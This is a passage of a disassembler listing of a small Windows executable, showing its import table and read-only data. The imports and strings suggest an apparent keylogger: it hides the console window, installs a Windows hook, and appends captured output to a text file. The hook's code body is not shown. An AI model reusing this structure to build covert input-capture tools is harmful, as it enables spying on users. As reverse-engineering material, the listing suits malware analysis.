.text:00401DF3 ; [00000006 BYTES: COLLAPSED FUNCTION _get_initial_narrow_environment]
.text:00401DF9 ; [00000006 BYTES: COLLAPSED FUNCTION _initterm]
.text:00401DFF ; [00000006 BYTES: COLLAPSED FUNCTION _initterm_e]
.text:00401E05 ; [00000006 BYTES: COLLAPSED FUNCTION exit]
.text:00401E0B ; [00000006 BYTES: COLLAPSED FUNCTION _exit]
.text:00401E11 ; [00000006 BYTES: COLLAPSED FUNCTION _set_fmode]
.text:00401E17 ; [00000006 BYTES: COLLAPSED FUNCTION __p___argc]
.text:00401E1D ; [00000006 BYTES: COLLAPSED FUNCTION __p___argv]
.text:00401E23 ; [00000006 BYTES: COLLAPSED FUNCTION _cexit]
.text:00401E29 ; [00000006 BYTES: COLLAPSED FUNCTION _c_exit]
.text:00401E2F ; [00000006 BYTES: COLLAPSED FUNCTION _register_thread_local_exe_atexit_callback]
.text:00401E35 ; [00000006 BYTES: COLLAPSED FUNCTION _configthreadlocale]
.text:00401E3B ; [00000006 BYTES: COLLAPSED FUNCTION _set_new_mode]
.text:00401E41 ; [00000006 BYTES: COLLAPSED FUNCTION __p__commode]
.text:00401E47 ; [00000006 BYTES: COLLAPSED FUNCTION _initialize_onexit_table]
.text:00401E4D ; [00000006 BYTES: COLLAPSED FUNCTION _register_onexit_function]
.text:00401E53 ; [00000006 BYTES: COLLAPSED FUNCTION _crt_atexit]
.text:00401E59 ; [00000006 BYTES: COLLAPSED FUNCTION _controlfp_s]
.text:00401E5F ; [00000006 BYTES: COLLAPSED FUNCTION terminate]
.text:00401E65 ; [00000078 BYTES: COLLAPSED FUNCTION __filter_x86_sse2_floating_point_exception_default]
.text:00401EDD                 align 200h
.text:00401EDD _text           ends
.text:00401EDD
.idata:00402000 ; Section 2. (virtual address 00002000)
.idata:00402000 ; Virtual size                  : 00000CB0 (   3248.)
.idata:00402000 ; Section size in file          : 00000E00 (   3584.)
.idata:00402000 ; Offset to raw data for section: 00001400
.idata:00402000 ; Flags 40000040: Data Readable
.idata:00402000 ; Alignment     : default
.idata:00402000 ;
.idata:00402000 ; Imports from KERNEL32.dll
.idata:00402000 ;
.idata:00402000 ; ===========================================================================
.idata:00402000
.idata:00402000 ; Segment type: Externs
.idata:00402000 ; _idata
.idata:00402000 ; BOOL (__stdcall *AllocConsole)()
.idata:00402000                 extrn AllocConsole:dword ; CODE XREF: _main↑p
.idata:00402000                                         ; DATA XREF: _main↑r ...
.idata:00402000                                         ; KERNEL32
.idata:00402004 ; BOOL (__stdcall *IsDebuggerPresent)()
.idata:00402004                 extrn IsDebuggerPresent:dword
.idata:00402004                                         ; CODE XREF: ___scrt_fastfail+D8↑p
.idata:00402004                                         ; DATA XREF: ___scrt_fastfail+D8↑r
.idata:00402004                                         ; KERNEL32
.idata:00402008 ; void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead)
.idata:00402008                 extrn InitializeSListHead:dword
.idata:00402008                                         ; CODE XREF: sub_401772+5↑p
.idata:00402008                                         ; DATA XREF: sub_401772+5↑r
.idata:00402008                                         ; KERNEL32
.idata:0040200C ; void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime)
.idata:0040200C                 extrn GetSystemTimeAsFileTime:dword
.idata:0040200C                                         ; CODE XREF: ___get_entropy+12↑p
.idata:0040200C                                         ; DATA XREF: ___get_entropy+12↑r
.idata:0040200C                                         ; KERNEL32
.idata:00402010 ; DWORD (__stdcall *GetCurrentThreadId)()
.idata:00402010                 extrn GetCurrentThreadId:dword
.idata:00402010                                         ; CODE XREF: ___get_entropy+21↑p
.idata:00402010                                         ; DATA XREF: ___get_entropy+21↑r
.idata:00402010                                         ; KERNEL32
.idata:00402014 ; DWORD (__stdcall *GetCurrentProcessId)()
.idata:00402014                 extrn GetCurrentProcessId:dword
.idata:00402014                                         ; CODE XREF: ___get_entropy+2A↑p
.idata:00402014                                         ; DATA XREF: ___get_entropy+2A↑r
.idata:00402014                                         ; KERNEL32
.idata:00402018 ; BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount)
.idata:00402018                 extrn QueryPerformanceCounter:dword
.idata:00402018                                         ; CODE XREF: ___get_entropy+37↑p
.idata:00402018                                         ; DATA XREF: ___get_entropy+37↑r
.idata:00402018                                         ; KERNEL32
.idata:0040201C ; BOOL (__stdcall *IsProcessorFeaturePresent)(DWORD ProcessorFeature)
.idata:0040201C                 extrn IsProcessorFeaturePresent:dword
.idata:0040201C                                         ; CODE XREF: ___report_gsfailure+B↑p
.idata:0040201C                                         ; ___scrt_fastfail+C↑p ...
.idata:0040201C                                         ; KERNEL32
.idata:00402020 ; BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode)
.idata:00402020                 extrn TerminateProcess:dword
.idata:00402020                                         ; CODE XREF: ___raise_securityfailure+20↑p
.idata:00402020                                         ; DATA XREF: ___raise_securityfailure+20↑r
.idata:00402020                                         ; KERNEL32
.idata:00402024 ; HANDLE (__stdcall *GetCurrentProcess)()
.idata:00402024                 extrn GetCurrentProcess:dword
.idata:00402024                                         ; CODE XREF: ___raise_securityfailure+19↑p
.idata:00402024                                         ; DATA XREF: ___raise_securityfailure+19↑r
.idata:00402024                                         ; KERNEL32
.idata:00402028 ; LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)
.idata:00402028                 extrn SetUnhandledExceptionFilter:dword
.idata:00402028                                         ; CODE XREF: ___raise_securityfailure+5↑p
.idata:00402028                                         ; ___scrt_fastfail+F1↑p ...
.idata:00402028                                         ; KERNEL32
.idata:0040202C ; LONG (__stdcall *UnhandledExceptionFilter)(struct _EXCEPTION_POINTERS *ExceptionInfo)
.idata:0040202C                 extrn UnhandledExceptionFilter:dword
.idata:0040202C                                         ; CODE XREF: ___raise_securityfailure+E↑p
.idata:0040202C                                         ; ___scrt_fastfail+FB↑p
.idata:0040202C                                         ; DATA XREF: ...
.idata:0040202C                                         ; KERNEL32
.idata:00402030 ; HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName)
.idata:00402030                 extrn GetModuleHandleW:dword
.idata:00402030                                         ; CODE XREF: ___scrt_is_managed_app+2↑p
.idata:00402030                                         ; DATA XREF: ___scrt_is_managed_app+2↑r
.idata:00402030                                         ; KERNEL32
.idata:00402034
.idata:00402038 ;
.idata:00402038 ; Imports from USER32.dll
.idata:00402038 ;
.idata:00402038 ; BOOL (__stdcall *ShowWindow)(HWND hWnd, int nCmdShow)
.idata:00402038                 extrn ShowWindow:dword  ; CODE XREF: _main+16↑p
.idata:00402038                                         ; DATA XREF: _main+16↑r ...
.idata:00402038                                         ; USER32
.idata:0040203C ; LRESULT (__stdcall *DispatchMessageW)(const MSG *lpMsg)
.idata:0040203C                 extrn DispatchMessageW:dword
.idata:0040203C                                         ; CODE XREF: _main+80↑p
.idata:0040203C                                         ; DATA XREF: _main+65↑r
.idata:0040203C                                         ; USER32
.idata:00402040 ; HWND (__stdcall *FindWindowA)(LPCSTR lpClassName, LPCSTR lpWindowName)
.idata:00402040                 extrn FindWindowA:dword ; CODE XREF: _main+D↑p
.idata:00402040                                         ; DATA XREF: _main+D↑r
.idata:00402040                                         ; USER32
.idata:00402044 ; HHOOK (__stdcall *SetWindowsHookExW)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId)
.idata:00402044                 extrn SetWindowsHookExW:dword
.idata:00402044                                         ; CODE XREF: _main+27↑p
.idata:00402044                                         ; DATA XREF: _main+27↑r
.idata:00402044                                         ; USER32
.idata:00402048 ; BOOL (__stdcall *TranslateMessage)(const MSG *lpMsg)
.idata:00402048                 extrn TranslateMessage:dword
.idata:00402048                                         ; CODE XREF: _main+78↑p
.idata:00402048                                         ; DATA XREF: _main+6C↑r
.idata:00402048                                         ; USER32
.idata:0040204C ; LRESULT (__stdcall *CallNextHookEx)(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam)
.idata:0040204C                 extrn CallNextHookEx:dword ; CODE XREF: fn+4C↑p
.idata:0040204C                                         ; DATA XREF: fn+4C↑r
.idata:0040204C                                         ; USER32
.idata:00402050 ; BOOL (__stdcall *GetMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax)
.idata:00402050                 extrn GetMessageW:dword ; CODE XREF: _main+5E↑p
.idata:00402050                                         ; _main+8E↑p
.idata:00402050                                         ; DATA XREF: ...
.idata:00402050                                         ; USER32
.idata:00402054
.idata:00402058 ;
.idata:00402058 ; Imports from VCRUNTIME140.dll
.idata:00402058 ;
.idata:00402058                 extrn __imp__except_handler4_common:dword
.idata:00402058                                         ; DATA XREF: _except_handler4_common↑r
.idata:00402058                                         ; .rdata:00402694↓o
.idata:00402058                                         ; VCRUNTIME140
.idata:0040205C ; void *(__cdecl *memset)(void *, int Val, size_t Size)
.idata:0040205C                 extrn __imp_memset:dword ; DATA XREF: memset↑r
.idata:0040205C                                         ; VCRUNTIME140
.idata:00402060                 extrn __imp___current_exception_context:dword
.idata:00402060                                         ; DATA XREF: __current_exception_context↑r
.idata:00402060                                         ; VCRUNTIME140
.idata:00402064                 extrn __imp___current_exception:dword
.idata:00402064                                         ; DATA XREF: __current_exception↑r
.idata:00402064                                         ; VCRUNTIME140
.idata:00402068
.idata:0040206C ;
.idata:0040206C ; Imports from api-ms-win-crt-heap-l1-1-0.dll
.idata:0040206C ;
.idata:0040206C ; int (__cdecl *_set_new_mode)(int NewMode)
.idata:0040206C                 extrn __imp__set_new_mode:dword
.idata:0040206C                                         ; DATA XREF: _set_new_mode↑r
.idata:0040206C                                         ; .rdata:004026F8↓o
.idata:0040206C                                         ; api-ms-win-crt-heap-l1-1-0
.idata:00402070
.idata:00402074 ;
.idata:00402074 ; Imports from api-ms-win-crt-locale-l1-1-0.dll
.idata:00402074 ;
.idata:00402074 ; int (__cdecl *_configthreadlocale)(int Flag)
.idata:00402074                 extrn __imp__configthreadlocale:dword
.idata:00402074                                         ; DATA XREF: _configthreadlocale↑r
.idata:00402074                                         ; .rdata:004026E4↓o
.idata:00402074                                         ; api-ms-win-crt-locale-l1-1-0
.idata:00402078
.idata:0040207C ;
.idata:0040207C ; Imports from api-ms-win-crt-math-l1-1-0.dll
.idata:0040207C ;
.idata:0040207C ; void (__cdecl *__setusermatherr)(_UserMathErrorFunctionPointer UserMathErrorFunction)
.idata:0040207C                 extrn __imp___setusermatherr:dword
.idata:0040207C                                         ; DATA XREF: __setusermatherr↑r
.idata:0040207C                                         ; .rdata:004026D0↓o
.idata:0040207C                                         ; api-ms-win-crt-math-l1-1-0
.idata:00402080
.idata:00402084 ;
.idata:00402084 ; Imports from api-ms-win-crt-runtime-l1-1-0.dll
.idata:00402084 ;
.idata:00402084 ; char **(__cdecl *_get_initial_narrow_environment)()
.idata:00402084                 extrn __imp__get_initial_narrow_environment:dword
.idata:00402084                                         ; DATA XREF: _get_initial_narrow_environment↑r
.idata:00402084                                         ; .rdata:004026BC↓o
.idata:00402084                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:00402088 ; void (__cdecl *_c_exit)()
.idata:00402088                 extrn __imp__c_exit:dword ; DATA XREF: _c_exit↑r
.idata:00402088                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:0040208C ; int (__cdecl *_initterm_e)(_PIFV *First, _PIFV *Last)
.idata:0040208C                 extrn __imp__initterm_e:dword
.idata:0040208C                                         ; DATA XREF: _initterm_e↑r
.idata:0040208C                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:00402090 ; int (__cdecl *_initialize_narrow_environment)()
.idata:00402090                 extrn __imp__initialize_narrow_environment:dword
.idata:00402090                                         ; DATA XREF: _initialize_narrow_environment↑r
.idata:00402090                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:00402094 ; void (__cdecl *_cexit)()
.idata:00402094                 extrn __imp__cexit:dword ; DATA XREF: _cexit↑r
.idata:00402094                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:00402098 ; int (__cdecl *_register_onexit_function)(_onexit_table_t *Table, _onexit_t Function)
.idata:00402098                 extrn __imp__register_onexit_function:dword
.idata:00402098                                         ; DATA XREF: _register_onexit_function↑r
.idata:00402098                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:0040209C ; int (__cdecl *_crt_atexit)(_PVFV Function)
.idata:0040209C                 extrn __imp__crt_atexit:dword
.idata:0040209C                                         ; DATA XREF: _crt_atexit↑r
.idata:0040209C                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004020A0 ; errno_t (__cdecl *_controlfp_s)(unsigned int *CurrentState, unsigned int NewValue, unsigned int Mask)
.idata:004020A0                 extrn __imp__controlfp_s:dword
.idata:004020A0                                         ; DATA XREF: _controlfp_s↑r
.idata:004020A0                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004020A4                 extrn __imp_terminate:dword
.idata:004020A4                                         ; DATA XREF: terminate↑r
.idata:004020A4                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004020A8 ; errno_t (__cdecl *_configure_narrow_argv)(_crt_argv_mode mode)
.idata:004020A8                 extrn __imp__configure_narrow_argv:dword
.idata:004020A8                                         ; DATA XREF: _configure_narrow_argv↑r
.idata:004020A8                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004020AC ; void (__cdecl *_initterm)(_PVFV *First, _PVFV *Last)
.idata:004020AC                 extrn __imp__initterm:dword
.idata:004020AC                                         ; DATA XREF: _initterm↑r
.idata:004020AC                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004020B0 ; void (__cdecl __noreturn *_exit)(int Code)
.idata:004020B0                 extrn __imp__exit:dword ; DATA XREF: _exit↑r
.idata:004020B0                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004020B4 ; int *(__cdecl *__p___argc)()
.idata:004020B4                 extrn __imp___p___argc:dword
.idata:004020B4                                         ; DATA XREF: __p___argc↑r
.idata:004020B4                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004020B8 ; int (__cdecl *_initialize_onexit_table)(_onexit_table_t *Table)
.idata:004020B8                 extrn __imp__initialize_onexit_table:dword
.idata:004020B8                                         ; DATA XREF: _initialize_onexit_table↑r
.idata:004020B8                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004020BC ; void (__cdecl *_set_app_type)(_crt_app_type Type)
.idata:004020BC                 extrn __imp__set_app_type:dword
.idata:004020BC                                         ; DATA XREF: _set_app_type↑r
.idata:004020BC                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004020C0 ; int (__cdecl *_seh_filter_exe)(unsigned int ExceptionNum, struct _EXCEPTION_POINTERS *ExceptionPtr)
.idata:004020C0                 extrn __imp__seh_filter_exe:dword
.idata:004020C0                                         ; DATA XREF: _seh_filter_exe↑r
.idata:004020C0                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004020C4 ; void (__cdecl __noreturn *exit)(int Code)
.idata:004020C4                 extrn __imp_exit:dword  ; DATA XREF: exit↑r
.idata:004020C4                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004020C8 ; void (__cdecl *_register_thread_local_exe_atexit_callback)(_tls_callback_type Callback)
.idata:004020C8                 extrn __imp__register_thread_local_exe_atexit_callback:dword
.idata:004020C8                                         ; DATA XREF: _register_thread_local_exe_atexit_callback↑r
.idata:004020C8                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004020CC ; char ***(__cdecl *__p___argv)()
.idata:004020CC                 extrn __imp___p___argv:dword
.idata:004020CC                                         ; DATA XREF: __p___argv↑r
.idata:004020CC                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004020D0
.idata:004020D4 ;
.idata:004020D4 ; Imports from api-ms-win-crt-stdio-l1-1-0.dll
.idata:004020D4 ;
.idata:004020D4 ; errno_t (__cdecl *_set_fmode)(int Mode)
.idata:004020D4                 extrn __imp__set_fmode:dword
.idata:004020D4                                         ; DATA XREF: _set_fmode↑r
.idata:004020D4                                         ; .rdata:004026A8↓o
.idata:004020D4                                         ; api-ms-win-crt-stdio-l1-1-0
.idata:004020D8 ; int (__cdecl *fputs)(const char *Buffer, FILE *Stream)
.idata:004020D8                 extrn fputs:dword       ; CODE XREF: fn+28↑p
.idata:004020D8                                         ; DATA XREF: fn+28↑r
.idata:004020D8                                         ; api-ms-win-crt-stdio-l1-1-0
.idata:004020DC ; int (__cdecl *puts)(const char *Buffer)
.idata:004020DC                 extrn puts:dword        ; CODE XREF: _main:loc_4010A2↑p
.idata:004020DC                                         ; DATA XREF: _main:loc_4010A2↑r
.idata:004020DC                                         ; api-ms-win-crt-stdio-l1-1-0
.idata:004020E0 ; int (__cdecl *fclose)(FILE *Stream)
.idata:004020E0                 extrn fclose:dword      ; CODE XREF: fn+34↑p
.idata:004020E0                                         ; DATA XREF: fn+34↑r
.idata:004020E0                                         ; api-ms-win-crt-stdio-l1-1-0
.idata:004020E4 ; FILE *(__cdecl *fopen)(const char *FileName, const char *Mode)
.idata:004020E4                 extrn fopen:dword       ; CODE XREF: fn+D↑p
.idata:004020E4                                         ; DATA XREF: fn+D↑r
.idata:004020E4                                         ; api-ms-win-crt-stdio-l1-1-0
.idata:004020E8 ; int *(__cdecl *__p__commode)()
.idata:004020E8                 extrn __imp___p__commode:dword
.idata:004020E8                                         ; DATA XREF: __p__commode↑r
.idata:004020E8                                         ; api-ms-win-crt-stdio-l1-1-0
.idata:004020EC
.idata:004020EC
.rdata:004020F0 ; ===========================================================================
.rdata:004020F0
.rdata:004020F0 ; Segment type: Pure data
.rdata:004020F0 ; Segment permissions: Read
.rdata:004020F0 _rdata          segment para public 'DATA' use32
.rdata:004020F0                 assume cs:_rdata
.rdata:004020F0                 ;org 4020F0h
.rdata:004020F0 ___guard_check_icall_fptr dd offset nullsub_1
.rdata:004020F0                                         ; DATA XREF: __scrt_common_main_seh(void)+B8↑r
.rdata:004020F0                                         ; sub_4019AC+19↑r ...
.rdata:004020F4 ___castguard_check_failure_os_handled_fptr db    0
.rdata:004020F4                                         ; DATA XREF: .rdata:00402248↓o
.rdata:004020F5                 db    0
.rdata:004020F6                 db    0
.rdata:004020F7                 db    0
.rdata:004020F8 ; const _PVFV dword_4020F8
.rdata:004020F8 dword_4020F8    dd 0                    ; DATA XREF: __scrt_common_main_seh(void)+72↑o
.rdata:004020FC                 dd offset sub_4011BB
.rdata:00402100 ; const _PVFV dword_402100
.rdata:00402100 dword_402100    dd 0                    ; DATA XREF: __scrt_common_main_seh(void):loc_40123A↑o
.rdata:00402104 ; const _PIFV First
.rdata:00402104 First           dd 0                    ; DATA XREF: __scrt_common_main_seh(void)+4C↑o
.rdata:00402108                 dd offset ?pre_c_initialization@@YAHXZ ; pre_c_initialization(void)
.rdata:0040210C                 dd offset sub_4011B3
.rdata:00402110 ; const _PIFV Last
.rdata:00402110 Last            dd 0                    ; DATA XREF: __scrt_common_main_seh(void)+47↑o
.rdata:00402114                 db    0
.rdata:00402115                 db    0
.rdata:00402116                 db    0
.rdata:00402117                 db    0
.rdata:00402118                 db    0
.rdata:00402119                 db    0
.rdata:0040211A                 db    0
.rdata:0040211B                 db    0
.rdata:0040211C                 db    0
.rdata:0040211D                 db    0
.rdata:0040211E                 db    0
.rdata:0040211F                 db    0
.rdata:00402120                 db    0
.rdata:00402121                 db    0
.rdata:00402122                 db    0
.rdata:00402123                 db    0
.rdata:00402124                 db    0
.rdata:00402125                 db    0
.rdata:00402126                 db    0
.rdata:00402127                 db    0
.rdata:00402128 ; const struct _EXCEPTION_POINTERS ExceptionInfo
.rdata:00402128 ExceptionInfo   _EXCEPTION_POINTERS <offset dword_403060, offset dword_4030B0>
.rdata:00402128                                         ; DATA XREF: ___report_gsfailure+EE↑o
.rdata:00402130 ; const CHAR ClassName[]
.rdata:00402130 ClassName       db 'ConsoleWindowClass',0 ; DATA XREF: _main+8↑o
.rdata:00402143                 align 4
.rdata:00402144 ; const char Mode[]
.rdata:00402144 Mode            db 'a+',0               ; DATA XREF: fn+3↑o
.rdata:00402147                 align 4
.rdata:00402148 ; const char FileName[]
.rdata:00402148 FileName        db 'C:\Program Files (x86)\note.txt',0
.rdata:00402148                                         ; DATA XREF: fn+8↑o
.rdata:00402168 aAllIsGood      db 'All is good',0      ; DATA XREF: _main+36↑o
.rdata:00402174 ; const char Buffer[]
.rdata:00402174 Buffer          db 'Something went wrong :(',0
.rdata:00402174                                         ; DATA XREF: _main:loc_40109D↑o
.rdata:0040218C                 align 10h
.rdata:00402190 __load_config_used dd 0C0h              ; Size
.rdata:00402194                 dd 0                    ; Time stamp
.rdata:00402198                 dw 2 dup(0)             ; Version: 0.0
.rdata:0040219C                 dd 0                    ; GlobalFlagsClear
.rdata:004021A0                 dd 0                    ; GlobalFlagsSet
.rdata:004021A4                 dd 0                    ; CriticalSectionDefaultTimeout
.rdata:004021A8                 dd 0                    ; DeCommitFreeBlockThreshold
.rdata:004021AC                 dd 0                    ; DeCommitTotalFreeThreshold
.rdata:004021B0                 dd 0                    ; LockPrefixTable
.rdata:004021B4                 dd 0                    ; MaximumAllocationSize
.rdata:004021B8                 dd 0                    ; VirtualMemoryThreshold
.rdata:004021BC                 dd 0                    ; ProcessHeapFlags
.rdata:004021C0                 dd 0                    ; ProcessAffinityMask
.rdata:004021C4                 dw 0                    ; CSDVersion
.rdata:004021C6                 dw 0                    ; Reserved1
.rdata:004021C8                 dd 0                    ; EditList
.rdata:004021CC                 dd offset ___security_cookie ; SecurityCookie
.rdata:004021D0                 dd offset ___safe_se_handler_table ; SEHandlerTable
.rdata:004021D4                 dd 1                    ; SEHandlerCount
.rdata:004021D8                 dd offset ___guard_check_icall_fptr ; GuardCFCheckFunctionPointer
.rdata:004021DC                 dd 0                    ; GuardCFDispatchFunctionPointer
.rdata:004021E0                 dd 0                    ; GuardCFFunctionTable
.rdata:004021E4                 dd 0                    ; GuardCFFunctionCount
.rdata:004021E8                 dd 100h                 ; GuardFlags
.rdata:004021EC                 dw 0                    ; CodeIntegrity.Flags
.rdata:004021EE                 dw 0                    ; CodeIntegrity.Catalog
.rdata:004021F0                 dd 0                    ; CodeIntegrity.CatalogOffset
.rdata:004021F4                 dd 0                    ; CodeIntegrity.Reserved
.rdata:004021F8                 dd 0                    ; GuardAddressTakenIatEntryTable
.rdata:004021FC                 dd 0                    ; GuardAddressTakenIatEntryCount
.rdata:00402200                 dd 0                    ; GuardLongJumpTargetTable
.rdata:00402204                 dd 0                    ; GuardLongJumpTargetCount
.rdata:00402208                 dd 0                    ; DynamicValueRelocTable
.rdata:0040220C                 dd 0                    ; CHPEMetadataPointer
.rdata:00402210                 dd 0                    ; GuardRFFailureRoutine
.rdata:00402214                 dd 0                    ; GuardRFFailureRoutineFunctionPointer
.rdata:00402218                 dd 0                    ; DynamicValueRelocTableOffset
.rdata:0040221C                 dw 0                    ; DynamicValueRelocTableSection
.rdata:0040221E                 dw 0                    ; Reserved2
.rdata:00402220                 dd 0                    ; GuardRFVerifyStackPointerFunctionPointer
.rdata:00402224                 dd 0                    ; HotPatchTableOffset
.rdata:00402228                 dd 0                    ; Reserved3
.rdata:0040222C                 dd 0                    ; EnclaveConfigurationPointer
.rdata:00402230                 dd offset ___volatile_metadata ; VolatileMetadataPointer
.rdata:00402234                 dd 0                    ; GuardEHContinuationTable
.rdata:00402238                 dd 0                    ; GuardEHContinuationCount
.rdata:0040223C                 dd 0                    ; GuardXFGCheckFunctionPointer
.rdata:00402240                 dd 0                    ; GuardXFGDispatchFunctionPointer
.rdata:00402244                 dd 0                    ; GuardXFGTableDispatchFunctionPointer
.rdata:00402248                 dd offset ___castguard_check_failure_os_handled_fptr ; CastGuardOsDeterminedFailureMode
.rdata:0040224C                 dd 0                    ; GuardMemcpyFunctionPointer
.rdata:00402250 ; Debug Directory entries
.rdata:00402250                 dd 0                    ; Characteristics
.rdata:00402254                 dd 673EBC7Bh            ; TimeDateStamp: Thu Nov 21 04:52:11 2024 UTC
.rdata:00402258                 dw 0                    ; MajorVersion
.rdata:0040225A                 dw 0                    ; MinorVersion
.rdata:0040225C                 dd 2                    ; Type: IMAGE_DEBUG_TYPE_CODEVIEW
.rdata:00402260                 dd 5Ch                  ; SizeOfData
.rdata:00402264                 dd rva asc_402330       ; AddressOfRawData
.rdata:00402268                 dd 1730h                ; PointerToRawData
.rdata:0040226C                 dd 0                    ; Characteristics
.rdata:00402270                 dd 673EBC7Bh            ; TimeDateStamp: Thu Nov 21 04:52:11 2024 UTC
.rdata:00402274                 dw 0                    ; MajorVersion
.rdata:00402276                 dw 0                    ; MinorVersion
.rdata:00402278                 dd 0Ch                  ; Type: IMAGE_DEBUG_TYPE_VC_FEATURE
.rdata:0040227C                 dd 14h                  ; SizeOfData
.rdata:00402280                 dd rva unk_40238C       ; AddressOfRawData
.rdata:00402284                 dd 178Ch                ; PointerToRawData
.rdata:00402288                 dd 0                    ; Characteristics
.rdata:0040228C                 dd 673EBC7Bh            ; TimeDateStamp: Thu Nov 21 04:52:11 2024 UTC
.rdata:00402290                 dw 0                    ; MajorVersion
.rdata:00402292                 dw 0                    ; MinorVersion
.rdata:00402294                 dd 0Dh                  ; Type: IMAGE_DEBUG_TYPE_POGO
.rdata:00402298                 dd 26Ch                 ; SizeOfData
.rdata:0040229C                 dd rva aGctl            ; AddressOfRawData
.rdata:004022A0                 dd 17A0h                ; PointerToRawData
.rdata:004022A4                 dd 0                    ; Characteristics
.rdata:004022A8                 dd 673EBC7Bh            ; TimeDateStamp: Thu Nov 21 04:52:11 2024 UTC
.rdata:004022AC                 dw 0                    ; MajorVersion
.rdata:004022AE                 dw 0                    ; MinorVersion
.rdata:004022B0                 dd 0Eh                  ; Type: IMAGE_DEBUG_TYPE_ILTCG
.rdata:004022B4                 dd 0                    ; SizeOfData
.rdata:004022B8                 dd 0                    ; AddressOfRawData
.rdata:004022BC                 dd 0                    ; PointerToRawData
.rdata:004022C0 ___safe_se_handler_table dd rva __except_handler4
.rdata:004022C0                                         ; DATA XREF: .rdata:004021D0↑o
.rdata:004022C4 ___volatile_metadata db  18h            ; DATA XREF: .rdata:00402230↑o
.rdata:004022C5                 db    0
.rdata:004022C6                 db    0
.rdata:004022C7                 db    0
.rdata:004022C8                 db    3
.rdata:004022C9                 db  80h
.rdata:004022CA                 db    3
.rdata:004022CB                 db  80h
.rdata:004022CC                 db 0DCh
.rdata:004022CD                 db  22h ; "
.rdata:004022CE                 db    0
.rdata:004022CF                 db    0
.rdata:004022D0                 db  3Ch ; <
.rdata:004022D1                 db    0
.rdata:004022D2                 db    0
.rdata:004022D3                 db    0
.rdata:004022D4                 db  18h
.rdata:004022D5                 db  23h ; #
.rdata:004022D6                 db    0
.rdata:004022D7                 db    0
.rdata:004022D8                 db  18h
.rdata:004022D9                 db    0
.rdata:004022DA                 db    0
.rdata:004022DB                 db    0
.rdata:004022DC                 db  5Bh ; [
.rdata:004022DD                 db  14h
.rdata:004022DE                 db    0
.rdata:004022DF                 db    0
.rdata:004022E0                 db  6Bh ; k
.rdata:004022E1                 db  14h
.rdata:004022E2                 db    0
.rdata:004022E3                 db    0
.rdata:004022E4                 db 0B8h
.rdata:004022E5                 db  1Ah
.rdata:004022E6                 db    0
.rdata:004022E7                 db    0
.rdata:004022E8                 db 0F4h
.rdata:004022E9                 db  1Ah
.rdata:004022EA                 db    0
.rdata:004022EB                 db    0
.rdata:004022EC                 db  6Bh ; k
.rdata:004022ED                 db  1Bh
.rdata:004022EE                 db    0
.rdata:004022EF                 db    0
.rdata:004022F0                 db 0A7h
.rdata:004022F1                 db  1Bh
.rdata:004022F2                 db    0
.rdata:004022F3                 db    0
.rdata:004022F4                 db 0D2h
.rdata:004022F5                 db  1Bh
.rdata:004022F6                 db    0
.rdata:004022F7                 db    0
.rdata:004022F8                 db  63h ; c
.rdata:004022F9                 db  1Ch
.rdata:004022FA                 db    0
.rdata:004022FB                 db    0
.rdata:004022FC                 db  68h ; h
.rdata:004022FD                 db  1Ch
.rdata:004022FE                 db    0
.rdata:004022FF                 db    0
.rdata:00402300                 db  6Bh ; k
.rdata:00402301                 db  1Ch
.rdata:00402302                 db    0
.rdata:00402303                 db    0
.rdata:00402304                 db  6Eh ; n
.rdata:00402305                 db  1Ch
.rdata:00402306                 db    0
.rdata:00402307                 db    0
.rdata:00402308                 db 0D9h
.rdata:00402309                 db  1Ch
.rdata:0040230A                 db    0
.rdata:0040230B                 db    0
.rdata:0040230C                 db 0E1h
.rdata:0040230D                 db  1Ch
.rdata:0040230E                 db    0
.rdata:0040230F                 db    0
.rdata:00402310                 db  49h ; I
.rdata:00402311                 db  1Dh
.rdata:00402312                 db    0
.rdata:00402313                 db    0
.rdata:00402314                 db  51h ; Q
.rdata:00402315                 db  1Dh
.rdata:00402316                 db    0
.rdata:00402317                 db    0
.rdata:00402318                 db 0FAh
.rdata:00402319                 db  10h
.rdata:0040231A                 db    0
.rdata:0040231B                 db    0
.rdata:0040231C                 db  16h
.rdata:0040231D                 db    9
.rdata:0040231E                 db    0
.rdata:0040231F                 db    0
.rdata:00402320                 db  55h ; U
.rdata:00402321                 db  1Ah
.rdata:00402322                 db    0
.rdata:00402323                 db    0
.rdata:00402324                 db  68h ; h
.rdata:00402325                 db    3
.rdata:00402326                 db    0
.rdata:00402327                 db    0
.rdata:00402328                 db  65h ; e
.rdata:00402329                 db  1Eh
.rdata:0040232A                 db    0
.rdata:0040232B                 db    0
.rdata:0040232C                 db  78h ; x
.rdata:0040232D                 db    0
.rdata:0040232E                 db    0
.rdata:0040232F                 db    0
.rdata:00402330 ; Debug information (IMAGE_DEBUG_TYPE_CODEVIEW)
